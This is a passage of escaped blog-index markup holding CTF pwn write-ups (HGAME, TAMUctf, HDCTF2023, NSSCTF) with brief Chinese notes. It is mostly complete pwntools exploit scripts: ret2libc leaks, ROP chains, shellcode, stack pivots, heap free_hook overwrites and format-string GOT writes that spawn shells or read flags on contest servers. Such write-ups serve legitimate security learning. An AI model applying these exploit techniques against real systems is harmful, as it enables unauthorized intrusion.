print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

delete(8)

add(11,0x90,b&amp;quot;/bin/sh&amp;quot;)

delete(8)

add(12,0xc0,cyclic(0xa0)+p64(free_hook))
add(13,0x90,b&amp;quot;qqq&amp;quot;)
add(14,0x90,p64(sys_addr))

delete(11)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HGAME week2 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/YqcmcWPUD/"" data-c="
          &lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;inspector-gadget&#34;&gt;inspector-&lt;strong&gt;gadget&lt;/strong&gt;:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./inspector-gadget&amp;quot;)
io=remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;inspector-gadget&amp;quot;)
elf=ELF(&amp;quot;./inspector-gadget&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

me=0x4011a3
pop_rdi_ret=0x40127b
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

io.recvuntil(b&amp;quot;pwn me\n&amp;quot;)
payload=cyclic(0x18)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(me)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
payload=cyclic(0x18)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)

io.recvuntil(b&amp;quot;pwn me\n&amp;quot;)
io.sendline(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000401274 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401276 : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401278 : pop r14 ; pop r15 ; ret
# 0x000000000040127a : pop r15 ; ret
# 0x0000000000401273 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401277 : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000401129 : pop rbp ; ret
# 0x000000000040127b : pop rdi ; ret
# 0x0000000000401279 : pop rsi ; pop r15 ; ret
# 0x0000000000401275 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401016 : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;randomness&#34;&gt;randomness：&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./randomness&amp;quot;)
io = remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;randomness&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

puts_got=0x403448
win=0x4011d3

io.recvuntil(b&amp;quot;seed:\n&amp;quot;)
io.sendline(str(puts_got))
cs.srand(0)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;guess:\n&amp;quot;)
# io.sendline(str(cs.rand()))
payload=str(win)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;sea-shells&#34;&gt;sea-shells:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./sea-shells&amp;quot;)
io = remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;sea-shells&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
# sc=b&amp;quot;\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&amp;quot;
sc=asm(shellcraft.sh())

io.recvuntil(b&amp;quot;1st number: &amp;quot;)
io.sendline(b&amp;quot;0&amp;quot;)

io.recvuntil(b&amp;quot;2nd number: &amp;quot;)
io.sendline(b&amp;quot;0&amp;quot;)

io.recvuntil(b&amp;quot;3rd number: &amp;quot;)
io.sendline(b&amp;quot;0&amp;quot;)

io.recvuntil(b&amp;quot;4th number: &amp;quot;)
io.sendline(str(cs.rand()))

io.recvuntil(b&amp;quot;work: &amp;quot;)
leak_addr=int(io.recv(12),16)
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;again? (y/n) &amp;quot;)
# io.sendline(b&amp;quot;n&amp;quot;)

payload=b&amp;quot;n&amp;quot;+p64(0)+p64(0)+p64(leak_addr+0x40)+sc
io.sendline(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000000131d : leave ; ret
# 0x0000000000001424 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001426 : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001428 : pop r14 ; pop r15 ; ret
# 0x000000000000142a : pop r15 ; ret
# 0x0000000000001423 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001427 : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000000115f : pop rbp ; ret
# 0x000000000000142b : pop rdi ; ret
# 0x0000000000001429 : pop rsi ; pop r15 ; ret
# 0x0000000000001425 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001016 : ret
# 0x0000000000001072 : ret 0x2f
# 0x000000000000128a : ret 0x8948

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;unlucky&#34;&gt;unlucky:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

while True:
    try:
        # io=process(&amp;quot;./unlucky&amp;quot;)
        io = remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;unlucky&amp;quot;)
        elf=ELF(&amp;quot;./unlucky&amp;quot;)
        cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
        # gdb.attach(io)
        # pause()
        io.recvuntil(b&amp;quot;: &amp;quot;)
        seed_addr=int(io.recv(15),16)
        print(&amp;quot;seed_addr: &amp;quot;+hex(seed_addr))
        seed_addr+=0x2ec3
        # num=c_int(69)
        # seed_addr = addressof(num)
        print(&amp;quot;seed_addr: &amp;quot;+hex(seed_addr))
        
        cs.srand(seed_addr)
        for i in range(7):
            io.recvuntil(b&amp;quot;:\n&amp;quot;)
            io.sendline(str(cs.rand()))
        
        io.recvline()
        io.interactive()
    except:
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
">TAMU wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/eUNOoLG_j/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN：&lt;/h3&gt;
&lt;h4 id=&#34;easy_overflow&#34;&gt;easy_overflow：&lt;/h4&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28949)

ret=0x40101a
payload=cyclic(0x18)+p64(ret)+p64(0x401176)
io.send(payload)
io.sendline(b&amp;quot;exec 1&amp;gt;&amp;amp;0&amp;quot;)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;enter-the-pwn-land&#34;&gt;enter the pwn land:&lt;/h4&gt;
&lt;p&gt;注意变量会被输入覆盖&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28032)
# io=process(&amp;quot;./service&amp;quot;)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;./libc1.so&amp;quot;)

puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
ret=0x40101a
pop_rdi_ret=0x401313
start=0x4010d0

payload=cyclic(0x28)+p32(1)+p32(0x2c)+p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))

sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=libc_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

payload=cyclic(0x28)+p32(1)+p32(0x2c)+p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)

io.interactive()
# Gadgets information
# ============================================================
# 0x000000000040130c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040130e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401310 : pop r14 ; pop r15 ; ret
# 0x0000000000401312 : pop r15 ; ret
# 0x000000000040130b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040130f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401313 : pop rdi ; ret
# 0x0000000000401311 : pop rsi ; pop r15 ; ret
# 0x000000000040130d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;simple_shellcode&#34;&gt;simple_shellcode:&lt;/h4&gt;
&lt;p&gt;溢出长度不够，构造read读orw shellcode，注意shellcode起始地址&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28491)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;shellcode:\n&amp;quot;)
shellcode=asm(&#39;&#39;&#39;
    xor rdi,rdi
    mov rsi,0xCAFE0010
    syscall
    nop
&#39;&#39;&#39;)
io.send(shellcode)
payload=asm(shellcraft.open(&amp;quot;./flag&amp;quot;)+shellcraft.read(3,0xCAFE0000,0x50)+shellcraft.write(1,0xCAFE0000,0x50))
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;orw&#34;&gt;orw:&lt;/h4&gt;
&lt;p&gt;第一次输入泄露libc，第二次栈迁移劫持rsp寄存器，&lt;s&gt;注意调栈问题=_=&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28611)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

bss_addr=0x404300   #404220  
read_text=0x4012CF
main=0x4012f0
pop_rdi_ret=0x401393
ret=0x40101a
rsi_r15=0x401391
leave_ret=0x4012be
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

io.recvuntil(b&amp;quot;task.\n&amp;quot;)
payload=cyclic(0x108)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
open_addr=libc_addr+libc.sym[b&amp;quot;open&amp;quot;]
write_addr=libc_addr+libc.sym[b&amp;quot;write&amp;quot;]
read_addr=elf.plt[b&amp;quot;read&amp;quot;]
pop_rdx_ret=0x142c92+libc_addr
pop_rsi_ret=0x2601f+libc_addr


# gdb.attach(io)
# pause()


io.recvuntil(b&amp;quot;task.\n&amp;quot;)
payload=cyclic(0x100)+p64(bss_addr)+p64(read_text)
payload=payload.ljust(0x130,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=cyclic(0x100-0x8)+b&amp;quot;./flag\x00\x00&amp;quot;+p64(bss_addr+0x100+0x8+0x8)+p64(read_text)
payload=payload.ljust(0x130,b&amp;quot;a&amp;quot;)
io.send(payload)

#open
payload=p64(pop_rdi_ret)+p64(0x4042f8)+p64(pop_rsi_ret)+p64(0)+p64(open_addr)
#read
payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(bss_addr+0x300)+p64(pop_rdx_ret)+p64(0x50)+p64(read_addr)
#write
payload+=p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(bss_addr+0x300)+p64(pop_rdx_ret)+p64(0x50)+p64(write_addr)

payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(bss_addr+0x8)+p64(leave_ret)
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004012be : leave ; ret
# 0x000000000040138c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040138e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401390 : pop r14 ; pop r15 ; ret
# 0x0000000000401392 : pop r15 ; ret
# 0x000000000040138b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040138f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040117d : pop rbp ; ret
# 0x0000000000401393 : pop rdi ; ret
# 0x0000000000401391 : pop rsi ; pop r15 ; ret
# 0x000000000040138d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x00000000004012a8 : ret 0x2be

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">HGAME week1 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/wfsX-MIpi/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN：&lt;/h3&gt;
&lt;h4 id=&#34;pwnner&#34;&gt;Pwnner：&lt;/h4&gt;
&lt;p&gt;伪随机+ret2text&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./pwnner&amp;quot;)
io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28470)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

cs.srand(0x39)
io.recvuntil(b&amp;quot;name:\n&amp;quot;)
payload=cs.rand()
io.send(str(payload))
io.recvuntil(b&amp;quot;next?\n&amp;quot;)
payload=cyclic(0x48)+p64(0x4008b2)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;keep-on&#34;&gt;KEEP ON:&lt;/h4&gt;
&lt;p&gt;fmtarg+栈迁移&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./hdctf&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28624)
elf=ELF(&amp;quot;./hdctf&amp;quot;)

read_text=0x4007D7
leave_ret=0x4007f2
pop_rdi_ret=0x4008d3
bss_addr=0x601800
main=0x400746
ret=0x4005b9

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;name: \n&amp;quot;)
io.send(b&amp;quot;%1$paaa./bin/sh\x00&amp;quot;)

io.recvuntil(b&amp;quot;,&amp;quot;)
sh=int(io.recv(14),16)+0x12
print(&amp;quot;sh: &amp;quot;+hex(sh))

io.recvuntil(b&amp;quot;keep on !\n&amp;quot;)
payload=cyclic(0x50)+p64(0x601900)+p64(read_text)
io.send(payload)
payload=p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(sh)+p64(elf.sym[b&amp;quot;system&amp;quot;])
payload=payload.ljust(0x50,b&amp;quot;a&amp;quot;)+p64(0x601900-0x50)+p64(leave_ret)
io.send(payload)

io.interactive()


# Gadgets information
# ============================================================
# 0x00000000004007f2 : leave ; ret
# 0x00000000004008cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008ce : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008d0 : pop r14 ; pop r15 ; ret
# 0x00000000004008d2 : pop r15 ; ret
# 0x00000000004008cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008cf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006b0 : pop rbp ; ret
# 0x00000000004008d3 : pop rdi ; ret
# 0x00000000004008d1 : pop rsi ; pop r15 ; ret
# 0x00000000004008cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005b9 : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;makewish&#34;&gt;Makewish：&lt;/h4&gt;
&lt;p&gt;存在栈上off by null，会将rbp末尾更改为&lt;code&gt;\x00&lt;/code&gt;，可以根据这一点爆破retn地址，使用ret抬高栈&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1682263550135.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./makewish&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28763)
elf=ELF(&amp;quot;./makewish&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

shell=0x4007c7
ret=0x4005d9

io.recvuntil(b&amp;quot;name\n\n&amp;quot;)
io.sendline(b&amp;quot;a&amp;quot;*(0x28-1)+b&amp;quot;b&amp;quot;)
io.recvuntil(b&amp;quot;b\n&amp;quot;)

canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary:  &amp;quot;+hex(canary))

io.recvuntil(b&amp;quot;key\n\n&amp;quot;)
io.send(p32(cs.rand()%1000+324))

gdb.attach(io)
pause()

io.recvuntil(b&amp;quot;me\n&amp;quot;)
payload=p64(ret)*10+p64(shell)
payload=payload.ljust(0x58,b&amp;quot;a&amp;quot;)+p64(canary)
io.send(payload)
io.recvuntil(b&amp;quot;that\n&amp;quot;)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040098c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400990 : pop r14 ; pop r15 ; ret
# 0x0000000000400992 : pop r15 ; ret
# 0x000000000040098b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006d0 : pop rbp ; ret
# 0x0000000000400993 : pop rdi ; ret
# 0x0000000000400991 : pop rsi ; pop r15 ; ret
# 0x000000000040098d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005d9 : ret
# 0x000000000040087a : ret 0xd089
# 0x000000000040083a : ret 0xfffd

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;minions&#34;&gt;Minions：&lt;/h4&gt;
&lt;p&gt;此题栈迁移到bss段上不行，迁移后运行顺序混乱，可迁移到栈上，此题选择劫持got表，利用fmtstr_payload实现任意地址写&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1682263742567.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./minions1&amp;quot;)
# io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28654)
elf=ELF(&amp;quot;./minions1&amp;quot;)

key=0x6010A0
printf_got=0x601030
hdctf_addr=0x6010C0
bss_addr=0x601300 
read_text=0x4007E8
leave_ret=0x400758
pop_rdi_ret=0x400893
ret=0x400581
main=0x400610

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;name?\n\n&amp;quot;)
payload=fmtstr_payload(6,{key:b&amp;quot;f&amp;quot;,hdctf_addr:b&amp;quot;/bin/sh\x00&amp;quot;})
io.send(payload)

io.recvuntil(b&amp;quot;you\n&amp;quot;)
payload=cyclic(0x38)+p64(main)
io.sendline(payload)

io.recvuntil(b&amp;quot;name?\n\n&amp;quot;)
payload=fmtstr_payload(6,{printf_got:elf.plt[b&amp;quot;system&amp;quot;]})
io.send(payload)

io.recvuntil(b&amp;quot;you\n&amp;quot;)
payload=cyclic(0x38)+p64(main)
io.sendline(payload)

io.recvuntil(b&amp;quot;name?\n\n&amp;quot;)
payload=b&amp;quot;/bin/sh\x00&amp;quot;
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400758 : leave ; ret
# 0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400890 : pop r14 ; pop r15 ; ret
# 0x0000000000400892 : pop r15 ; ret
# 0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400670 : pop rbp ; ret
# 0x0000000000400893 : pop rdi ; ret
# 0x0000000000400891 : pop rsi ; pop r15 ; ret
# 0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400581 : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">HDCTF2023 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/0vJHH8rer/"" data-c="
          &lt;h3 id=&#34;easy-pwn&#34;&gt;EASY PWN：&lt;/h3&gt;
&lt;p&gt;伪随机&lt;br&gt;
&lt;code&gt;open(&amp;quot;/dev/urandom&amp;quot;, 0)&lt;/code&gt;产生的随机数，比较可以用&lt;code&gt;\x00&lt;/code&gt;绕过，爆破即可&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


while True:
    try:
        # io=process(&amp;quot;./easypwn&amp;quot;)
        io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28637)
        io.recvuntil(b&amp;quot;Password:\n&amp;quot;)
        io.sendline(b&amp;quot;\x00&amp;quot;)
        io.recvline()
        io.recvline()
        io.interactive()
    except:
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;shellcode&#34;&gt;Shellcode：&lt;/h3&gt;
&lt;p&gt;shellcode模板题&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./pwn1&amp;quot;)
io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28533)
leave_ret=0x40074e
ex_addr=0x6010A0
shellcode=b&amp;quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;quot;
# shellcode=asm(shellcraft.sh())
io.recvuntil(b&amp;quot;Please.\n&amp;quot;)

# gdb.attach(io)
# pause()

io.send(shellcode)
io.recvuntil(b&amp;quot;Let&#39;s start!\n&amp;quot;)
payload=cyclic(0x12)+p64(ex_addr)
io.send(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040074e : leave ; ret
# 0x000000000040028e : ret

# Unique gadgets found: 2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;真男人下120层&#34;&gt;真男人下120层：&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681657864643.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
最后一次seed通过gdb动态调试发现在稳定在&lt;code&gt;0xA5462D92&lt;/code&gt;左右&lt;br&gt;
使用cdll模拟随机数产生即可&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28438)
# io=process(&amp;quot;./bin&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)						
cs.srand(0xA5462D92)																					

# gdb.attach(io)
# pause()

for i in range(120):
    io.recvuntil(b&amp;quot;\n&amp;quot;)
    payload=cs.rand()%4+1
    io.sendline(str(payload))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;random&#34;&gt;RANDOM：&lt;/h3&gt;
&lt;p&gt;cdll模拟随机数，然后构造read读shellcode，栈可写，并且有haha函数可以jmp_rsp，迁移到栈上写shellcode&lt;br&gt;
此题本地调试卡住，远端通。。。。。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28725)
io=process(&amp;quot;./R&amp;quot;)
